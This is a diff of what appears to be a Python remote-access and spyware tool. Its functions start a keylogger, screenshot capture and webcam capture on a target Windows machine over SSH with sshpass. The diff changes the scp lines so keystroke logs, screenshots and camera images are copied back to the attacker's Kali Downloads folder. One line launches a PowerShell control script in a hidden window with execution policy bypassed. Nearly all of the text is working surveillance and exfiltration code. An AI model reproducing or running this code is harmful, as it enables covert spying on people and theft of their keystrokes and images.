@@ -84,7 +84,7 @@ def run_control_keylogger(address, username, password, temp, startup):
 
 def take_file_log(address, username, password, path):
     # file output *.log
-    os.system(f"sshpass -p \"{password}\" scp {username}.log {username}@{address}:{path}/sad")
+    os.system(f"sshpass -p \"{password}\" scp {username}@{address}:{path}/sad/{username}.log /home/kali/Downloads")
     
 def screenshot(address, username, password, temp, startup):
     print("[*] Starting run control screenshot ...")
@@ -95,7 +95,7 @@ def screenshot(address, username, password, temp, startup):
     print("[+] Screenshot running ...")
     
 def take_screenshot(address, username, password, path):
-    os.system(f"sshpass -p \"{password}\" scp happy.png {username}@{address}:{path}/sad")
+    os.system(f"sshpass -p \"{password}\" scp {username}@{address}:{path}/sad/happy.png /home/kali/Downloads")
 
 def control_camera(address, username, password, temp, startup):
     print("[*] Starting control camera ...")
@@ -106,9 +106,10 @@ def control_camera(address, username, password, temp, startup):
     print("[+] Started camera . . .")
 
 def take_camera_picture(address, username, password, path):
-    os.system(f"sshpass -p \"{password}\" scp image.bmp {username}@{address}:{path}/happy")
+    os.system(f"sshpass -p \"{password}\" scp {username}@{address}:{path}/happy/image.bmp /home/kali/Downloads")
     run_control = f"start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {path}\happy\control_system.ps1"
     run_command(address, username, password, run_control)
+    
     
 def terminated():
     return
